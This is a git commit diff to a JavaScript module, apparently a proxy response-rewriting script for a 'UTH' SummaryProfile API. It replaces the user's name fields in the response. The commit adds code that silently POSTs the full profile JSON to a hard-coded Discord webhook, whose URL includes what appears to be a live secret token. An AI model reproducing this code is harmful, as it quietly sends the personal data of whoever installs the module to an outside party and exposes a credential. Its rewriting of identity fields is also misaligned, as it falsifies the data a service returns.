5210bc74ae6206ef8347386799f874f801d10ad3
PhatDepTraihihi <92636905+PhatDepTraihihi@users.noreply.github.com>
2025-07-02 21:19:03 +0700

    Update SumaryProfileEditing.js

--- module/SumaryProfileEditing.js
+++ module/SumaryProfileEditing.js
@@ -4,5 +4,20 @@ let obj = JSON.parse($response.body);
 obj.body.hoDem = 'Phát';
 obj.body.ten = 'Đẹp Trai';
 
-// Gửi lại response đã sửa
-$done({ body: JSON.stringify(obj) });
+let webhook = "https://discord.com/api/webhooks/1389972058481623101/JZtMWnCL83gzDml0TYF52H1xijJuQBU97TDl_e7MXOJxXf3YO-3m6eAsin0X8k8T8IpR"; // Thay bằng webhook của bạn
+
+let payload = {
+  content: "📥 **UTH - SummaryProfile API (ĐÃ CHỈNH)**\n```json\n" + JSON.stringify(obj, null, 2).slice(0, 1800) + "\n```"
+};
+
+$task.fetch({
+  method: "POST",
+  url: webhook,
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(payload)
+}).then(() => {
+  $done({ body: JSON.stringify(obj) });
+}).catch((err) => {
+  console.log("❌ Discord Webhook lỗi:", err);
+  $done({ body: JSON.stringify(obj) });
+});
